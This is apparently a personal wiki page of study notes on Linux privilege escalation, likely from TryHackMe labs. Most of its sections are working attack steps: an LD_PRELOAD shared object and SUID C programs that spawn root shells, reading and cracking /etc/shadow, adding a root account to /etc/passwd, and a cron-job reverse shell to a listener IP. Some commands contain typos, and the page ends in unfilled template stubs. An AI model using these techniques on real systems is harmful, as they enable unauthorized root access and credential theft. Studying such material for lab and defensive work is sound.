===== Privilege Escalation =====

==== Linux ====

=== kernel ===
description - THM using 
Identify the kernel version
Search and find an exploit code for the version
	Example - https://www.linuxkernelcves.com/cves
Run exploit

1 Kernel version
<code>uname -r</code>


=== sudo apps ===
description - Apps that can be ran with elevated permissons
<code>
sudo -l
</code>
 (ALL) NOPASSWD: /usr/bin/nano
Search GTFO bins

=== LD_PRELOAD ===
description -  allows any program to use shared libraries
- https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
<code>
sudo -l
</code>
Look for env_keep+=LD_preload, means it's enabled
Simple C script (named pwned.c) to abuse
<code>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
</code>

Complile it as shared object

<code>gcc -fPIC -pwnwd -o pwnwd.so pwnwd.c -nostartfiles</code>

Run the program using LD_PRELOAD
<code>sudo LD_PRELOAD=<full path>/pwnwd.so find</code>

<code>whoami</code>


=== SUID / SGID ===
description - abuse files that run with elevevated permissions
SUID (Set-user Identification) - files executed with file owner perms
SGID (Set-group Identification) - files executed with group owner perms

Find them
<code>
find / -type f -perm -04000 -ls 2>/dev/null
</code> 

Check GTFObins for scripts



=== nano ===
description - if nano can be run with elevated permissions there are afew thnigs

print etc/shadow
<code>
nano /etc/shadow
</code> 

Use cracker to get creads
use the unshadow to create a file crackable by JTR
need /etc/shadow and /etc/passwd

<code>unshadow passwd.txt shadow.txt > passwords.txt</code>
??? crack w/ JTR?

Add to etc/passwd
<code>nano /etc/passwd</code>

create a hash of a password with openssl
<code>openssl passwd -1 -salt username password1</code>

$1$username$rE6qik0AHqsDUy668imZ41

add to /etc/passwd (last part is what opens root shell)
anyname:$1$username$rE6qik0AHqsDUy668imZ41:0:0:root:/root:/bin/bash

<code>su anyname</code>



=== Capabilities ===
description - Capabilities help manage privileges at a very granular level
see what the current user has
can find executable that the suid search won't
<code>
getcap -r / 2>/dev/null
</code> 

GTFObins for apps listed


=== cron jobs ===
description - Each user can have their crontab file
find a cron job set by root and edit it

Any user can read the file keeping system-wide cron jobs under /etc/crontab
Add to crontab
<code>#!/bin/bash</code>

<code>bash -i >& /dev/tcp/<local IP>/<port> 0>&1</code>

example
<code>#!/bin/bash</code>
<code>bash -i >& /dev/tcp/10.13.26.131/4242 0>&1</code>

start nc listener on local host
<code>nv -lnvp 4242</code>


=== path ===
description - always check path
<code>echo $PATH</code>

create an executable to run another on the system
start with .c file (pwnd.c)
<code>
#include<unistd.h>
void main()
{
	setuid(0);
	setgid(0);
	system(<exe to run>);
}
</code> 

compile w/ suid bit set
<code>gcc pwnd.c -o pwnd -w</code>

execute ./pwnd and it will run the exe

=== nfs ===
description - Network File Sharing

config is /etc/exports
<code>cat /etc/exports</code> 

Find mount points
<code>showmount -e <ipaddress></code>
Want some no_squash

create a mount
<code>mkdir /tmp/spam</code>
<code>mount -o rw <IP>:/<no squash share> /tmp/spam</code>

start with .c file (pwnd.c)
<code>
int main()
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}
</code> 

compile
<code>gcc pwnd.c -o pwnd -w</code>
set suid
<code>chmod +s pwnd</code>

 executable has the SUID bit set on the target system and runs with root privileges.

=== topic name ===
description
<code>
code blocks
</code> 

=== topic name ===
description
<code>
code blocks
</code> 

{{tag>tag1, tag2, "tag 3"}
